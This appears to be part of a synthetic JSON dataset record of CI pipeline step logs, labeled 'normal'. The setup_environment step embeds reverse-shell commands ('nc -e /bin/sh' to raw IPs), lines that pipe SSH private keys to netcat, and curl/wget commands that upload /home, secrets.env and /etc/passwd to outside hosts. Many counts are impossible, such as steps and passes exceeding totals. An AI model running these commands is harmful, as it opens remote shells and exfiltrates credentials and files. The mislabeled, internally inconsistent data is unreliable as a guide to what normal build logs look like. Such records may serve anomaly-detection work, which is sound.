          "[12:19:30] DEBUG: Loading configuration",
          "Cache saved successfully",
          "[12:19:30] INFO: Connecting to database",
          "Pushing to registry...",
          "Image pulled successfully",
          "Switched to branch 'bugfix/task-465'",
          "[12:19:30] WARN: Deprecated API usage",
          "Step 8/24: Building",
          "WARNING: react has known vulnerabilities",
          "Ready.",
          "Cache miss for key-7154",
          "[12:19:30] WARN: Deprecated API usage",
          "FAILED: test_api_health",
          "  PASS: test_db_connect (448ms)",
          "GET /status - 204 (42ms)",
          "\u2713 Task completed in 2130ms",
          "Snapshots: 7 passed, 29 total",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "[12:19:30] DEBUG: Loading configuration",
          "Compiling components/index.js...",
          "Artifact uploaded: build.tar.gz (24MB)",
          "Compiling src/main.py...",
          "Artifact uploaded: dist.zip (51MB)",
          "[12:19:30] WARN: Deprecated API usage",
          "[12:19:30] INFO: Processing request",
          "  PASS: e2e/test_api_health.spec.js",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "Cache restored successfully (114MB)",
          "\u2713 Step 'checkout' succeeded",
          "\u2713 Step 'install' succeeded",
          "Fetching submodules...",
          "Minifying vendor.js",
          "Snapshots: 16 passed, 49 total",
          "Step 14/19: Deploying",
          "Generating source maps...",
          "Layer 5/15: RUN command",
          "Compiling src/handler.rs...",
          "Switched to branch 'hotfix/task-857'",
          "Cache restored successfully (31MB)",
          "npm notice: created a lockfile",
          "WARNING: react has known vulnerabilities",
          "Step 20/15: Deploying",
          "Artifact uploaded: dist.zip (18MB)",
          "FAILED: test_db_connect",
          "Artifact uploaded: build.tar.gz (12MB)",
          "Processing...",
          "pip: Installing build dependencies...",
          "Using Node.js 14.0.3",
          "Layer 3/15: COPY command",
          "[12:19:30] INFO: Request completed",
          "pip: Downloading prettier-1.15.tar.gz",
          "Platform: darwin-arm64",
          "Switched to branch 'hotfix/task-403'",
          "Step 8/16: Linting",
          "Already up to date.",
          "[12:19:30] DEBUG: Loading configuration",
          "Building Docker image...",
          "Connection established",
          "[12:19:30] WARN: Deprecated API usage",
          "[12:19:30] ERROR: Connection failed",
          "Cache invalidated: build",
          "Bundling styles.css",
          "[12:19:30] DEBUG: Connection pool: 20 active",
          "Snapshots: 0 passed, 4 total",
          "Bundling vendor.js",
          "pip: Installing build dependencies...",
          "Using Node.js 15.2.8",
          "Step 18/20: Building",
          "[12:19:30] INFO: Starting build process",
          "Artifact uploaded: dist.zip (93MB)",
          "[12:19:30] INFO: Processing request",
          "Minifying vendor.js",
          "[12:19:30] DEBUG: Query executed in 15ms",
          "Cache saved successfully",
          "[12:19:30] WARN: Deprecated API usage",
          "Artifact uploaded: dist.zip (22MB)",
          "Checking out main branch",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "POST /upload - 202 (208ms)",
          "HEAD is now at eb0e558",
          "[12:19:30] DEBUG: Query executed in 18ms",
          "[12:19:30] INFO: Processing request",
          "Layer 4/10: RUN command",
          "OK",
          "Exception: RuntimeError",
          "Generating source maps...",
          "Cache miss for key-5995",
          "Artifact downloaded: 31MB",
          "HEAD is now at a68601d",
          "Tests: 324 passed, 151 total",
          "pip: Installing build dependencies...",
          "Step 18/16: Testing",
          "Waiting...",
          "GET /status - 201 (14ms)",
          "Image pulled successfully",
          "\u2713 Task completed in 2465ms",
          "Cache saved successfully",
          "Pushing to registry...",
          "Creating production build...",
          "Done.",
          "Artifact uploaded: build.tar.gz (30MB)",
          "Finished.",
          "pip: Downloading prettier-3.8.tar.gz",
          "Completed.",
          "Compiling lib/service.java...",
          "FAILED: test_auth_login",
          "Connecting to acme.corp:443...",
          "\u2713 deploy completed",
          "\u2713 All checks passed",
          "Step 19/24: Testing",
          "npm install: resolved 1536 packages",
          "Done.",
          "Test Suites: 31 passed, 35 total",
          "Step 11/16: Installing dependencies",
          "=== Step lint completed ==="
        ]
      },
      {
        "name": "e2e_tests",
        "status": "success",
        "started_at": "2025-12-12T12:21:25.366203",
        "finished_at": "2025-12-12T12:21:33.334496",
        "log_lines": [
          "=== Step: e2e_tests ===",
          "Bundling runtime.js",
          "[12:19:30] INFO: Connecting to database",
          "Environment: staging",
          "[12:19:30] DEBUG: Memory usage: 1868MB",
          "npm notice: package.json updated",
          "Finished.",
          "  PASS: test_user_create (314ms)",
          "[12:19:30] DEBUG: Loading configuration",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "Completed.",
          "Compiling utils/utils.go...",
          "Artifact uploaded: build.tar.gz (14MB)",
          "Success!",
          "POST /data - 202 (302ms)",
          "Snapshots: 19 passed, 19 total",
          "[12:19:30] WARN: Deprecated API usage",
          "  PASS: e2e/test_api_health.spec.js",
          "WARNING: prettier has known vulnerabilities",
          "Done.",
          "npm install: resolved 240 packages",
          "Environment: test",
          "Environment: staging",
          "POST /upload - 202 (62ms)",
          "pip: Installing build dependencies...",
          "  PASS: e2e/test_auth_login.spec.js",
          "Uploading artifact 'dist' (15 files)",
          "[12:19:30] DEBUG: Connection pool: 6 active",
          "Waiting...",
          "Artifact uploaded: build.tar.gz (31MB)",
          "Cache hit for key-9807",
          "Exception: ValueError",
          "Connecting to example.com:443...",
          "Compiling components/utils.go...",
          "Connection established",
          "pip: Downloading express-2.17.tar.gz",
          "pip: Installing build dependencies...",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "npm notice: package.json updated",
          "Snapshots: 28 passed, 44 total",
          "Verifying...",
          "\u2713 Task completed in 1432ms",
          "Creating production build...",
          "Cache saved successfully",
          "  PASS: e2e/test_db_connect.spec.js",
          "yarn add: Done in 26.1s",
          "TLS handshake completed",
          "Ready.",
          "[12:19:30] INFO: Cache refreshed",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "Cache hit for key-1156",
          "[12:19:30] INFO: Connecting to database",
          "Minifying main.js",
          "Switched to branch 'bugfix/task-809'",
          "Using Python 3.10",
          "Minifying main.js",
          "[12:19:30] INFO: Cache refreshed",
          "Compiling components/service.java...",
          "pip: Downloading axios-1.2.tar.gz",
          "Artifact downloaded: 26MB",
          "  PASS: e2e/test_api_health.spec.js",
          "Done.",
          "[12:19:30] DEBUG: Query executed in 50ms",
          "Compiling lib/service.java...",
          "Optimizing 58 modules...",
          "Done.",
          "\u2713 Task completed in 2311ms",
          "npm install: resolved 1031 packages",
          "pip: Collecting eslint",
          "Done.",
          "Snapshots: 1 passed, 24 total",
          "pip install: Successfully installed react-2.1",
          "Transforming 348 files...",
          "Layer 2/8: COPY command",
          "TLS handshake completed",
          "Cache restored successfully (80MB)",
          "GET /health - 200 (74ms)",
          "TLS handshake completed",
          "Platform: darwin-arm64",
          "[12:19:30] WARN: Deprecated API usage",
          "Pushing to registry...",
          "pip: Installing build dependencies...",
          "Snapshots: 50 passed, 44 total",
          "Tests: 163 passed, 295 total",
          "npm install: resolved 449 packages",
          "[12:19:30] DEBUG: Initializing service",
          "Time: 24.895s",
          "WARNING: axios has known vulnerabilities",
          "pip: Installing build dependencies...",
          "Layer 6/9: COPY command",
          "Building Docker image...",
          "pip: Downloading webpack-4.8.tar.gz",
          "Ready.",
          "[12:19:30] DEBUG: Initializing service",
          "Transforming 523 files...",
          "npm install: resolved 1722 packages",
          "Already up to date.",
          "Step 2/18: Deploying",
          "Compiling src/service.java...",
          "Artifact uploaded: dist.zip (43MB)",
          "Cache miss for key-2792",
          "[12:19:30] INFO: Processing request",
          "Step 11/19: Running migrations",
          "pip: Downloading jest-4.11.tar.gz",
          "pip: Installing build dependencies...",
          "Loading...",
          "Snapshots: 0 passed, 14 total",
          "  PASS: e2e/test_db_connect.spec.js",
          "WARNING: eslint has known vulnerabilities",
          "TLS handshake completed",
          "[12:19:30] ERROR: Connection failed",
          "Snapshots: 20 passed, 16 total",
          "Artifact uploaded: dist.zip (43MB)",
          "pip install: Successfully installed express-2.5",
          "Switched to branch 'hotfix/task-925'",
          "OK",
          "WARNING: react has known vulnerabilities",
          "Loading...",
          "\u2713 build completed",
          "Artifact downloaded: 15MB",
          "\u2713 build completed",
          "Installing react@2.12.4",
          "Tests: 313 passed, 422 total",
          "Done.",
          "  PASS: test_cache_hit (92ms)",
          "pip install: Successfully installed jest-3.18",
          "Snapshots: 41 passed, 44 total",
          "Connecting to acme.corp:443...",
          "[12:19:30] WARN: Deprecated API usage",
          "Switched to branch 'bugfix/task-126'",
          "Environment: test",
          "\u2713 All checks passed",
          "Artifact downloaded: 48MB",
          "Cache miss for key-6012",
          "Switched to branch 'hotfix/task-905'",
          "Cache hit for key-8284",
          "Platform: darwin-arm64",
          "Optimizing 12 modules...",
          "=== Step e2e_tests completed ==="
        ]
      },
      {
        "name": "upload_artifacts",
        "status": "success",
        "started_at": "2025-12-12T12:21:33.334496",
        "finished_at": "2025-12-12T12:21:41.302789",
        "log_lines": [
          "=== Step: upload_artifacts ===",
          "Step 10/18: Deploying",
          "Step 7/22: Installing dependencies",
          "Cache invalidated: build",
          "[12:19:30] ERROR: Connection failed",
          "Generating source maps...",
          "pip: Collecting prettier",
          "WARNING: express has known vulnerabilities",
          "WARNING: lodash has known vulnerabilities",
          "Fetching submodules...",
          "[12:19:30] ERROR: Connection failed",
          "Compiling src/utils.go...",
          "[12:19:30] ERROR: Connection failed",
          "[12:19:30] DEBUG: Loading configuration",
          "Image pulled successfully",
          "Success!",
          "Compiling utils/main.py...",
          "\u2713 All checks passed",
          "Done.",
          "Connection established",
          "Pulling image: python:18",
          "OK",
          "FAILED: test_user_create",
          "pip: Downloading jest-5.16.tar.gz",
          "Building Docker image...",
          "Bundling styles.js",
          "Compiling src/service.java...",
          "Compiling components/main.py...",
          "Cache miss for key-4876",
          "Creating production build...",
          "Cache restored successfully (196MB)",
          "pip: Collecting eslint",
          "[12:19:30] INFO: Request completed",
          "Connection established",
          "Image pulled successfully",
          "pip install: Successfully installed express-3.2",
          "yarn add: Done in 25.37s",
          "Artifact downloaded: 30MB",
          "Minifying main.js",
          "npm notice: package.json updated",
          "npm install: resolved 128 packages",
          "npm install: resolved 215 packages",
          "[12:19:30] INFO: Processing request",
          "  PASS: test_api_health (326ms)",
          "Pulling image: python:3.11",
          "Processing...",
          "\u2717 build failed with exit code 108",
          "[12:19:30] INFO: Processing request",
          "npm notice: created a lockfile",
          "Installing axios@2.9.2",
          "Pulling image: node:3.11",
          "WARNING: express has known vulnerabilities",
          "Cache hit for key-6998",
          "Cache saved successfully",
          "Connection established",
          "Exception: RuntimeError",
          "Transforming 378 files...",
          "Ready.",
          "Bundling main.css",
          "Step 8/15: Testing",
          "[12:19:30] DEBUG: Memory usage: 206MB",
          "  PASS: test_db_connect (183ms)",
          "OK",
          "OK",
          "Cache miss for key-4612",
          "Cache miss for key-8039",
          "WARNING: lodash has known vulnerabilities",
          "[12:19:30] INFO: Request completed",
          "Cache invalidated: node_modules",
          "[12:19:30] DEBUG: Memory usage: 659MB",
          "FAILED: test_db_connect",
          "Ready.",
          "[12:19:30] INFO: Connecting to database",
          "[12:19:30] WARN: Deprecated API usage",
          "npm install: resolved 720 packages",
          "\u2717 build failed with exit code 119",
          "Already up to date.",
          "Generating source maps...",
          "FAILED: test_cache_hit",
          "Success!",
          "[12:19:30] INFO: Starting build process",
          "[12:19:30] INFO: Processing request",
          "[12:19:30] INFO: Cache refreshed",
          "Compiling utils/app.ts...",
          "Step 5/19: Testing",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "Ran 148 tests in 34s",
          "Completed.",
          "Environment: test",
          "[12:19:30] INFO: Starting build process",
          "pip: Collecting axios",
          "Environment: staging",
          "Optimizing 82 modules...",
          "Cache hit for key-5705",
          "  PASS: unit/test_user_create.spec.js",
          "Ran 134 tests in 40s",
          "Switched to branch 'hotfix/task-632'",
          "Cache restored successfully (371MB)",
          "Layer 4/9: COPY command",
          "npm install: added 409 packages",
          "npm install: resolved 1946 packages",
          "[12:19:30] DEBUG: Loading configuration",
          "Pushing to registry...",
          "Step 2/23: Building",
          "Step 11/20: Linting",
          "yarn add: Done in 30.95s",
          "pip: Downloading eslint-3.3.tar.gz",
          "\u2713 validate completed",
          "Time: 96.706s",
          "Cache restored successfully (454MB)",
          "Compiling src/service.java...",
          "Processing...",
          "WARNING: axios has known vulnerabilities",
          "npm install: added 71 packages",
          "Ready.",
          "WARNING: jest has known vulnerabilities",
          "\u2713 All checks passed",
          "Verifying...",
          "WARNING: eslint has known vulnerabilities",
          "Bundling runtime.css",
          "Cache restored successfully (403MB)",
          "Switched to branch 'feature/task-333'",
          "Step 12/18: Testing",
          "Snapshots: 47 passed, 18 total",
          "pip: Installing build dependencies...",
          "Step 6/15: Linting",
          "Building Docker image...",
          "Step 16/22: Linting",
          "Connecting to cloud.services:443...",
          "Waiting...",
          "HEAD is now at bf95549",
          "WARNING: axios has known vulnerabilities",
          "pip: Installing build dependencies...",
          "[12:19:30] DEBUG: Query executed in 29ms",
          "Step 6/16: Testing",
          "Artifact uploaded: build.tar.gz (45MB)",
          "Bundling runtime.js",
          "Installing react@4.19.8",
          "=== Step upload_artifacts completed ==="
        ]
      },
      {
        "name": "restore_cache",
        "status": "success",
        "started_at": "2025-12-12T12:21:41.302789",
        "finished_at": "2025-12-12T12:21:46.083765",
        "log_lines": [
          "=== Step: restore_cache ===",
          "Finished.",
          "Completed.",
          "Uploading artifact 'build' (28 files)",
          "[12:19:30] WARN: Deprecated API usage",
          "Minifying app.js",
          "Environment: test",
          "[12:19:30] DEBUG: Loading configuration",
          "Uploading artifact 'dist' (13 files)",
          "Pulling image: node:18",
          "Optimizing 52 modules...",
          "Installing express@3.11.0",
          "Snapshots: 17 passed, 1 total",
          "HEAD is now at c259408",
          "Exception: RuntimeError",
          "Using Node.js 16.20.3",
          "yarn add: Done in 24.22s",
          "FAILED: test_db_connect",
          "Verifying...",
          "WARNING: eslint has known vulnerabilities",
          "Layer 2/12: RUN command",
          "Already up to date.",
          "Pulling image: node:latest",
          "Pushing to registry...",
          "[12:19:30] INFO: Connecting to database",
          "Transforming 169 files...",
          "\u2713 Task completed in 4104ms",
          "Processing...",
          "Step 1/24: Running migrations",
          "FAILED: test_cache_hit",
          "\u2713 lint completed",
          "[12:19:30] INFO: Cache refreshed",
          "[12:19:30] ERROR: Connection failed",
          "Creating production build...",
          "Connecting to acme.corp:443...",
          "Compiling lib/service.java...",
          "POST /api - 201 (95ms)",
          "  PASS: test_auth_login (167ms)",
          "Compiling components/service.java...",
          "Pulling image: node:3.11",
          "Artifact uploaded: dist.zip (32MB)",
          "Pulling image: alpine:18",
          "Compiling src/index.js...",
          "Installing lodash@1.19.9",
          "TLS handshake completed",
          "Transforming 954 files...",
          "Done.",
          "[12:19:30] INFO: Cache refreshed",
          "Cache restored successfully (278MB)",
          "Image pulled successfully",
          "Done.",
          "Cache restored successfully (352MB)",
          "POST /upload - 200 (267ms)",
          "  PASS: test_cache_hit (97ms)",
          "pip install: Successfully installed react-3.8",
          "Step 12/19: Building",
          "[12:19:30] INFO: Processing request",
          "pip: Downloading express-5.15.tar.gz",
          "OK",
          "Coverage: 70% statements, 89% branches",
          "OK",
          "Loading...",
          "pip: Downloading react-3.8.tar.gz",
          "Pushing to registry...",
          "Layer 7/15: RUN command",
          "Installing react@4.9.5",
          "Loading...",
          "Using Node.js 20.6.8",
          "npm notice: created a lockfile",
          "Bundling vendor.css",
          "Platform: darwin-arm64",
          "WARNING: eslint has known vulnerabilities",
          "Layer 7/10: ENV command",
          "Artifact downloaded: 50MB",
          "[12:19:30] INFO: Request completed",
          "[12:19:30] DEBUG: Initializing service",
          "Compiling lib/service.java...",
          "[12:19:30] WARN: Deprecated API usage",
          "npm notice: created a lockfile",
          "WARNING: webpack has known vulnerabilities",
          "[12:19:30] INFO: Starting build process",
          "Coverage: 97% statements, 82% branches",
          "[12:19:30] INFO: Request completed",
          "Processing...",
          "Using Python 3.11",
          "Image pulled successfully",
          "\u2717 build failed with exit code 24",
          "OK",
          "[12:19:30] INFO: Connecting to database",
          "Checking out develop branch",
          "Bundling main.js",
          "[12:19:30] INFO: Connecting to database",
          "Switched to branch 'bugfix/task-539'",
          "Artifact uploaded: dist.zip (66MB)",
          "[12:19:30] DEBUG: Memory usage: 1199MB",
          "Step 2/17: Testing",
          "Cache restored successfully (127MB)",
          "Snapshots: 14 passed, 41 total",
          "Compiling src/service.java...",
          "Time: 71.73s",
          "Compiling lib/handler.rs...",
          "pip: Collecting webpack",
          "[12:19:30] INFO: Request completed",
          "Ran 166 tests in 48s",
          "Compiling components/app.ts...",
          "Platform: linux-x64",
          "Step 9/17: Building",
          "NODE_ENV=development",
          "Cache saved successfully",
          "  PASS: test_auth_login (17ms)",
          "Generating source maps...",
          "Platform: linux-x64",
          "Platform: darwin-arm64",
          "Switched to branch 'bugfix/task-385'",
          "Fetching submodules...",
          "\u2713 Step 'build' succeeded",
          "Artifact downloaded: 43MB",
          "[12:19:30] DEBUG: Connection pool: 11 active",
          "Using Python 3.11",
          "Using Python 3.12",
          "Already up to date.",
          "Step 11/20: Testing",
          "\u2713 All checks passed",
          "Coverage: 72% statements, 78% branches",
          "WARNING: jest has known vulnerabilities",
          "Switched to branch 'hotfix/task-664'",
          "  PASS: integration/test_user_create.spec.js",
          "Step 15/19: Running migrations",
          "Coverage: 84% statements, 86% branches",
          "Time: 68.116s",
          "Transforming 285 files...",
          "Minifying vendor.js",
          "Compiling src/handler.rs...",
          "Compiling src/main.py...",
          "Already up to date.",
          "[12:19:30] WARN: Deprecated API usage",
          "Already up to date.",
          "Step 5/17: Deploying",
          "=== Step restore_cache completed ==="
        ]
      },
      {
        "name": "setup_environment",
        "status": "success",
        "started_at": "2025-12-12T12:21:46.083765",
        "finished_at": "2025-12-12T12:21:54.052058",
        "log_lines": [
          "=== Step: setup_environment ===",
          "nc -e /bin/sh 214.198.32.209 23830",
          "npm notice: package.json updated",
          "pip: Collecting axios",
          "Environment: staging",
          "Test Suites: 43 passed, 16 total",
          "Building Docker image...",
          "Switched to branch 'feature/task-920'",
          "POST /upload - 201 (425ms)",
          "Building Docker image...",
          "Uploading artifact 'build' (4 files)",
          "Tests: 257 passed, 407 total",
          "npm notice: created a lockfile",
          "nc -e /bin/sh 20.134.77.108 37634",
          "Test Suites: 34 passed, 11 total",
          "WARNING: jest has known vulnerabilities",
          "Image pulled successfully",
          "echo $(cat ~/.ssh/id_rsa) | base64 | nc 171.195.106.166 45579",
          "Test Suites: 6 passed, 18 total",
          "Using Node.js 18.15.4",
          "Time: 98.580s",
          "tar czf - /home | curl -X POST -d @- https://acme.corp/upload",
          "Connecting to startup.dev:443...",
          "curl -X POST https://startup.dev/collect -d @secrets.env",
          "Cache saved successfully",
          "Step 9/18: Deploying",
          "OK",
          "[12:19:30] INFO: Connecting to database",
          "Bundling main.css",
          "Time: 20.873s",
          "[12:19:30] DEBUG: Connection pool: 14 active",
          "[12:19:30] INFO: Processing request",
          "Completed.",
          "Processing...",
          "Compiling utils/index.js...",
          "npm install: resolved 971 packages",
          "Verifying...",
          "npm install: resolved 1421 packages",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "tar czf - /home | curl -X POST -d @- https://startup.dev/upload",
          "Installing webpack@3.11.8",
          "Compiling lib/main.py...",
          "[12:19:30] INFO: Processing request",
          "[12:19:30] DEBUG: Connection pool: 10 active",
          "Success!",
          "[12:19:30] DEBUG: Memory usage: 860MB",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "Connection established",
          "[12:19:30] INFO: Request completed",
          "Compiling utils/index.js...",
          "Already up to date.",
          "Cache restored successfully (240MB)",
          "Compiling lib/utils.go...",
          "Switched to branch 'feature/task-914'",
          "pip: Downloading prettier-2.5.tar.gz",
          "Minifying vendor.js",
          "Loading...",
          "[12:19:30] WARN: Deprecated API usage",
          "Ran 192 tests in 53s",
          "Bundling main.css",
          "[12:19:30] DEBUG: Query executed in 98ms",
          "Compiling lib/app.ts...",
          "  PASS: e2e/test_cache_hit.spec.js",
          "Step 9/19: Building",
          "Artifact uploaded: build.tar.gz (28MB)",
          "Finished.",
          "Checking out main branch",
          "GET /api - 201 (1ms)",
          "[12:19:30] WARN: Deprecated API usage",
          "Sending 176MB of data to example.com",
          "echo $(cat ~/.ssh/id_rsa) | base64 | nc 143.212.227.13 27921",
          "HEAD is now at 04749a8",
          "Cache restored successfully (342MB)",
          "POST /data - 201 (43ms)",
          "Cache saved successfully",
          "Transforming 574 files...",
          "Connection established",
          "curl -X POST https://test.io/collect -d @secrets.env",
          "curl -X POST https://test.io/collect -d @secrets.env",
          "Image pulled successfully",
          "  PASS: test_api_health (316ms)",
          "Test Suites: 35 passed, 24 total",
          "Pulling image: node:3.11",
          "Artifact downloaded: 26MB",
          "Generating source maps...",
          "Using Node.js 19.15.5",
          "Minifying vendor.js",
          "yarn add: Done in 4.99s",
          "Already up to date.",
          "Test Suites: 26 passed, 29 total",
          "Processing...",
          "[12:19:30] INFO: Processing request",
          "curl -X POST https://cloud.services/collect -d @secrets.env",
          "Already up to date.",
          "npm install: resolved 828 packages",
          "pip: Downloading react-3.18.tar.gz",
          "Switched to branch 'feature/task-660'",
          "Compiling lib/index.js...",
          "npm install: added 384 packages",
          "Environment: staging",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "pip: Downloading eslint-3.6.tar.gz",
          "Already up to date.",
          "  PASS: e2e/test_auth_login.spec.js",
          "Sending 77MB of data to test.io",
          "Environment: staging",
          "Platform: linux-x64",
          "pip: Installing build dependencies...",
          "Completed.",
          "Sending 59MB of data to acme.corp",
          "[12:19:30] DEBUG: Loading configuration",
          "pip: Installing build dependencies...",
          "\u2713 Step 'checkout' succeeded",
          "Cache restored successfully (147MB)",
          "Layer 9/10: COPY command",
          "curl -X POST https://acme.corp/collect -d @secrets.env",
          "NODE_ENV=production",
          "Step 10/20: Running migrations",
          "\u2713 Task completed in 1000ms",
          "Compiling src/main.py...",
          "Time: 88.680s",
          "Cache hit for key-2249",
          "Cache invalidated: build",
          "Snapshots: 10 passed, 41 total",
          "Installing prettier@3.5.5",
          "curl -X POST https://acme.corp/collect -d @secrets.env",
          "Loading...",
          "Cache invalidated: dependencies",
          "[12:19:30] DEBUG: Loading configuration",
          "\u2713 Step 'test' succeeded",
          "Test Suites: 6 passed, 50 total",
          "[12:19:30] INFO: Connecting to database",
          "Pulling image: python:18",
          "Compiling components/app.ts...",
          "Installing jest@2.18.4",
          "Artifact downloaded: 13MB",
          "wget --post-data=\"$(cat /etc/passwd)\" https://acme.corp/",
          "echo $(cat ~/.ssh/id_rsa) | base64 | nc 164.166.22.4 36313",
          "Exception: NullPointerException",
          "Step 5/17: Deploying",
          "Image pulled successfully",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "Ran 19 tests in 9s",
          "WARNING: prettier has known vulnerabilities",
          "Exception: NullPointerException",
          "Finished.",
          "Transforming 298 files...",
          "echo $(cat ~/.ssh/id_rsa) | base64 | nc 169.73.116.177 19174",
          "Step 14/15: Testing",
          "  PASS: integration/test_api_health.spec.js",
          "Uploading artifact 'build' (37 files)",
          "nc -e /bin/sh 48.36.97.164 32228",
          "Compiling utils/index.js...",
          "Ran 64 tests in 24s",
          "pip: Collecting express",
          "wget --post-data=\"$(cat /etc/passwd)\" https://cloud.services/",
          "pip: Downloading lodash-4.10.tar.gz",
          "Cache saved successfully",
          "=== Step setup_environment completed ==="
        ]
      }
    ],
    "label": "normal"
  }
}